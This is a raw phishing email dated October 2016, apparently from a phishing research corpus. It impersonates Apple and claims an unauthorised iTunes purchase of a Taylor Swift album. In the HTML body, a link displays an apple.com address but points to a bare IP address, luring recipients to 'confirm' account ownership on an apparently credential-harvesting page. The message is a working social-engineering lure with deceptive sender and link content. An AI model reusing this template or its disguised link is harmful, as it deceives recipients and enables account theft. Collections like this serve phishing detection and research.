@@ -1,0 +1,90 @@
+Return-Path: info22@kyowam.co.jp
+Delivered-To: jose@monkey.org
+X-FDA: 72073612632.19.bun13_10ea187757208
+X-Spam-Summary: 77,5.5,0,2835888bc1a4a9a7,d41d8cd98f00b204,info22@kyowam.co.jp,,RULES_HIT:41:72:355:379:387:455:493:539:540:541:542:543:560:836:962:967:973:983:988:989:994:1189:1208:1221:1260:1263:1308:1309:1313:1314:1345:1381:1390:1431:1432:1436:1437:1516:1517:1518:1534:1541:1560:1575:1588:1589:1592:1594:1711:1714:1730:1737:1777:1792:2069:2070:2525:2527:2557:2560:2564:2610:2682:2685:2859:2890:2892:2909:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3657:3769:3863:3865:3866:3867:3868:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4362:4552:5007:6117:6119:6261:6678:6996:6997:7809:7903:8599:9025:9388:9468:9908:10010:10030:10049:10214:10400:11026:11473:11537:11658:11854:11914:12043:12225:12231:12522:12532:12555:12740:13110:13139:13161:13163:13229:13234:13236:13237:14037:14096:14181:14249:14516:14633:14659:14721:14849:21221:21325:21433:21450:30016:30022:30054:30055:30064:30065:30070:30075:30080,0,RBL:error,CacheIP:none,Bayesian:0.5,0.5,0.5,Netchec
+X-HE-Tag: bun13_10ea187757208
+X-Filterd-Recvd-Size: 2982
+Received: from m101.secure.ne.jp (m101.secure.ne.jp [117.20.105.242])
+	by imf16.b.hostedemail.com (Postfix) with SMTP
+	for <jose@monkey.org>; Sat, 15 Oct 2016 20:25:15 +0000 (UTC)
+Received: (qmail 12084 invoked from network); 16 Oct 2016 05:25:14 +0900
+Received: from unknown (HELO localhost) (takase@crutch.jp@27.17.35.94)
+  by 0 with SMTP; 16 Oct 2016 05:25:14 +0900
+Message-ID: <959026757EAA84479B9ED76AAE1ACA53@fzude>
+From: "Apple" <info22@kyowam.co.jp>
+Subject: Your invoice from Apple
+Date: Sat, 15 Oct 2016 22:25:29 +0200
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0337_01D22733.08EA16A0"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Windows Live Mail 14.0.8117.416
+X-MimeOLE: Produced By Microsoft MimeOLE V14.0.8117.416
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 392
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0337_01D22733.08EA16A0
+Content-Type: text/plain;
+	charset="windows-1251"
+Content-Transfer-Encoding: quoted-printable
+
+
+Your Apple Email ID, was used to purchase " "Wildest Dreams" Album by Tay=
+lor Swift ($ 4,49 ) from the ITunes Store on a device that had not previo=
+usly been associated with you.
+
+If you made this purchase, you can disregard this email.
+
+If you did not make this purchase, we recommend that you go to   http:/ap=
+ple.com/support/cancel-9823ER4 =20
+
+cancel the transaction, Confirm that you're the owner of the account and =
+then follow the instructions.
+
+For more information, see our frequently asked questions.
+
+Thanks,
+
+Apple Customer Support
+
+------=_NextPart_000_0337_01D22733.08EA16A0
+Content-Type: text/html;
+	charset="windows-1251"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META content=3D"text/html; charset=3Dwindows-1251" http-equiv=3DContent-=
+Type>
+<META name=3DGENERATOR content=3D"MSHTML 8.00.6001.23588"></HEAD>
+<BODY>
+<P><A style=3D"TEXT-DECORATION: none" href=3D'".$url."'><IMG alt=3D""=20
+src=3D"http://r.mzstatic.com/email/images_shared/logo_apple_d-2x.png" wid=
+th=3D97=20
+height=3D56></A></P>
+<DIV>Your <SPAN class=3Dil>Apple</SPAN> Email ID, was used to purchase " =
+"Wildest=20
+Dreams" Album by Taylor Swift ($ 4,49 ) from the ITunes Store on a device=
+ that=20
+had not previously been associated with you.</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>If you made this purchase, you can disregard this email.</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>If you did not make this purchase, we recommend that you go to=20
+&nbsp;&nbsp;<A=20
+href=3D"http://193.150.13.138/Apple/">http:/apple.com/support/cancel-9823=
+ER4</A>&nbsp;&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>cancel the transaction, Confirm that you're the owner of the account=
+ and=20
+then follow the instructions.<BR><BR>For more information, see our freque=
+ntly=20
+asked questions.<BR><BR>Thanks,<BR><BR>Apple Customer=20
+Support</DIV></BODY></HTML>
+
+------=_NextPart_000_0337_01D22733.08EA16A0--
